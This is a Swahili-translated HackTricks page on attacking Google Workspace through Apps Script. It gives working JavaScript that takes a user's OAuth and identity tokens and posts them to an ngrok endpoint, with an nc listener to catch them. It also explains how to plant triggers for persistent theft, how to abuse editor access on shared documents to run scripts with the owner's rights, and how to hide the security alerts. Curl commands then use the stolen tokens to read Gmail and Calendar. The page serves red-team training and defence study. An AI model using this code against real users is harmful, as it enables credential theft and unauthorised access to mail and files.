# GWS - Maandiko ya Programu

{% hint style="success" %}
Jifunze na zoezi la Kuvamia AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la Kuvamia GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Aunga mkono HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Maandiko ya Programu

Maandiko ya Programu ni **mambo ya msimbo ambayo yatachochewa wakati mtumiaji mwenye ruhusa ya mhariri anapata hati ambayo Maandiko ya Programu imeunganishwa nayo** na baada ya **kukubali ombi la OAuth**. Wanaweza pia kuwekwa ili watekelezwe **kila wakati fulani** na mmiliki wa Maandiko ya Programu (Uthabiti).

### Unda Maandiko ya Programu

Kuna njia kadhaa za kuunda Maandiko ya Programu, ingawa njia za kawaida zaidi ni **kutoka kwa Hati ya Google (ya aina yoyote)** na kama **mradi wa kujitegemea**:

<details>

<summary>Tengeneza mradi uliounganishwa na chombo kutoka Google Docs, Sheets, au Slides</summary>

1. Fungua hati ya Docs, karatasi ya Sheets, au mhadhara wa Slides.
2. Bonyeza **Extensions** > **Google Apps Script**.
3. Katika mhariri wa msimbo, bonyeza **Mradi usio na jina**.
4. Toa jina la mradi wako na bonyeza **Badilisha jina**.

</details>

<details>

<summary>Tengeneza mradi wa kujitegemea</summary>

Ili kuunda mradi wa kujitegemea kutoka kwa Maandiko ya Programu:

1. Nenda kwenye [`script.google.com`](https://script.google.com/).
2. Bonyeza **Mradi Mpya**.
3. Katika mhariri wa msimbo, bonyeza **Mradi usio na jina**.
4. Toa jina la mradi wako na bonyeza **Badilisha jina**.

</details>

<details>

<summary>Tengeneza mradi wa kujitegemea kutoka kwa Google Drive</summary>

1. Fungua [Google Drive](https://drive.google.com/).
2. Bonyeza **Mpya** > **Zaidi** > **Google Apps Script**.

</details>

<details>

<summary>Tengeneza mradi uliounganishwa na fomu ya Google Forms</summary>

1. Fungua fomu kwenye Google Forms.
2. Bonyeza Zaidi more\_vert > **Mhariri wa Msimbo**.
3. Katika mhariri wa msimbo, bonyeza **Mradi usio na jina**.
4. Toa jina la mradi wako na bonyeza **Badilisha jina**.

</details>

<details>

<summary>Tengeneza mradi wa kujitegemea kwa kutumia zana ya mstari wa amri ya clasp</summary>

`clasp` ni zana ya mstari wa amri inayokuwezesha kuunda, kuvuta/kusukuma, na kusambaza miradi ya Maandiko ya Programu kutoka kwenye terminal.

Tazama [Mwongozo wa Kutumia Kielelezo cha Mstari wa Amri kwa kutumia `clasp`](https://developers.google.com/apps-script/guides/clasp) kwa maelezo zaidi.

</details>

## Skena ya Maandiko ya Programu <a href="#create-using-clasp" id="create-using-clasp"></a>

### Unda Karatasi ya Google na Maandiko ya Programu

Anza kwa kutengeneza Maandiko ya Programu, mapendekezo yangu kwa hali hii ni kuunda Karatasi ya Google na kwenda **`Extensions > Maandiko ya Programu`**, hii itafungua **Maandiko ya Programu mpya kwako iliyounganishwa na karatasi**.

### Fichua kitufe

Ili kutoa ufikiaji kwa kitufe cha OAuth unahitaji bonyeza **`Huduma +` na ongeza ruhusa kama**:

* **AdminDirectory**: Kufikia watumiaji na vikundi vya saraka (ikiwa mtumiaji ana ruhusa za kutosha)
* **Gmail**: Kufikia data ya gmail
* **Drive**: Kufikia data ya drive
* **Google Sheets API**: Ili ifanye kazi na kichocheo

Kubadilisha **ruhusa zinazohitajika** unaweza kwenda kwenye mipangilio ya mradi na kuwezesha: **`Onyesha faili ya maneno ya "appsscript.json" katika mhariri`.** 

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Kukamata ombi unaweza tu kukimbia:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions zinazohitajika kutekeleza App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Kama ombi la nje linatolewa, kibali cha OAuth pia **kitauliza ruhusa ya kufikia sehemu za nje**.
{% endhint %}

### Unda Kichocheo

Baada ya App kusomwa, bonyeza **‚è∞ Triggers** ili kuunda kichocheo. Kama **function** chagua **`getToken`**, inatekelezwa wakati wa kupelekwa **`Head`**, chagua chanzo cha tukio **`From spreadsheet`** na aina ya tukio chagua **`On open`** au **`On edit`** (kulingana na mahitaji yako) na uhifadhi.

Tambua kwamba unaweza kuangalia **utekelezaji wa App Scripts katika kichupo cha Utekelezaji** ikiwa unataka kutatua tatizo fulani.

### Kushiriki

Ili **kuchochea** **App Script** muathirika anahitaji kuunganisha na **Upatikanaji wa Mhariri**.

{% hint style="success" %}
**Token** utakaotumika kutekeleza **App Script** utakuwa wa **muundaji wa kichocheo**, hata kama faili imefunguliwa kama Mhariri na watumiaji wengine.
{% endhint %}

### Kutumia Nyaraka Zilizoshirikiwa Nami

{% hint style="danger" %}
Ikiwa mtu fulani **alishiriki nawe hati na App Scripts na kichocheo kikitumia Head** ya App Script (si kupelekwa kwa kudumu), unaweza kuhariri msimbo wa App Script (kwa kuongeza kwa mfano kazi za kuiba token), kufikia, na **App Script itatekelezwa na ruhusa za mtumiaji aliyeshiriki hati hiyo nawe**! (tambua kwamba token ya OAuth ya mmiliki itakuwa na wigo wa ufikiaji uliopewa wakati kichocheo kilipoundwa).

**Taarifa itatumwa kwa muundaji wa script ikionyesha kwamba mtu fulani amehariri script** (Je, unadhani kutumia ruhusa za gmail kuzalisha kichujio cha kuzuia tahadhari?)
{% endhint %}

{% hint style="success" %}
Ikiwa **mshambuliaji anabadilisha wigo wa App Script** sasisho **hayatakuwa yametekelezwa** kwenye hati mpaka **kichocheo kipya** na mabadiliko kianzishwe. Hivyo, mshambuliaji hataweza kuiba token ya muundaji na wigo zaidi kuliko ule alioweka kwenye kichocheo alichounda.
{% endhint %}

### Kunakili Badala ya Kushiriki

Unapounda kiungo cha kushiriki hati kiungo kama hiki hufanyika: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Ikiwa **badilisha** mwisho **"/edit"** kwa **"/copy"**, badala ya kufikia, google itakuuliza ikiwa unataka **kuunda nakala ya hati:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Ikiwa mtumiaji anaikopi na kuifungua, **maudhui ya hati na App Scripts zitakopiwa**, hata hivyo **vichocheo havitakopi**, hivyo **hakuna kitakachotekelezwa**.

### Kushiriki kama Programu ya Wavuti

Tambua kwamba pia ni **kushiriki App Script kama Programu ya Wavuti** (katika Mhariri wa App Script, peleka kama Programu ya Wavuti), lakini tahadhari kama hii itaonekana:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Ikifuatiwa na **kibali cha kawaida cha OAuth** kinachoomba **ruhusa zinazohitajika**.

### Jaribio

Unaweza kujaribu token uliokusanywa kuorodhesha barua pepe na:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Orodhesha kalenda ya mtumiaji:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Skripti ya Programu kama Uimara

Chaguo moja la uimara lingekuwa **kuunda hati na kuongeza kichocheo kwa kazi ya kupata kitufe** na kushiriki hati hiyo na mshambuliaji ili kila wakati mshambuliaji anapofungua faili, **anatoa siri ya kitufe cha mhanga.**

Pia ni rahisi kuunda Skripti ya Programu na kuifanya iweze kichocheo kila baada ya muda X (kama kila dakika, saa, siku...). Mshambuliaji ambaye amepata **vyeti vilivyoharibiwa au kikao cha mhanga anaweza kuweka kichocheo cha wakati wa Skripti ya Programu na kufichua kitufe cha OAuth cha hali ya juu kila siku**:

Tuunde Skripti ya Programu, nenda kwa Kichocheo, bonyeza Ongeza Kichocheo, na chagua chanzo cha tukio kama Time-driven na chagua chaguo linalokufaa zaidi:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Hii itaunda barua pepe ya tahadhari ya usalama na ujumbe wa kushinikiza kwenye simu yako ukiarifu kuhusu hili.
{% endhint %}

### Kizuizi cha Uthibitishaji wa Hati iliyoshirikiwa Bila Kuthibitishwa

Zaidi ya hayo, ikiwa mtu amekushirikisha hati na **upatikanaji wa wahariri**, unaweza kuzalisha **Skripti za Programu ndani ya hati** na **MMILIKI (muundaji) wa hati atakuwa mmiliki wa Skripti ya Programu**.

{% hint style="warning" %}
Hii inamaanisha kwamba **muundaji wa hati ataonekana kama muundaji wa Skripti ya Programu** yoyote ambayo mtu yeyote mwenye upatikanaji wa wahariri anaunda ndani yake.

Hii pia inamaanisha kwamba **Skripti ya Programu itakuwa na imani na mazingira ya Workspace** ya muundaji wa hati.
{% endhint %}

{% hint style="danger" %}
Hii pia inamaanisha kwamba ikiwa **Skripti ya Programu tayari ipo** na watu wamepa **upatikanaji**, mtu yeyote mwenye **Ruhusa ya Mhariri** kwenye hati anaweza **kuibadilisha na kutumia upatikanaji huo.**\
Kutumia hili pia unahitaji watu kichocheo cha Skripti ya Programu. Na mbinu moja nzuri ni **kuchapisha skripti kama programu ya wavuti**. Wakati watu **waliokubali** kwa tayari **upatikanaji** wa Skripti ya Programu wanapata ukurasa wa wavuti, wata **kichocheo cha Skripti ya Programu** (hii pia inafanya kazi kwa kutumia vitambulisho vya `<img>`).
{% endhint %}

{% hint style="success" %}
Jifunze & zoezi la Kuvamia AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & zoezi la Kuvamia GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>unga mkono HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
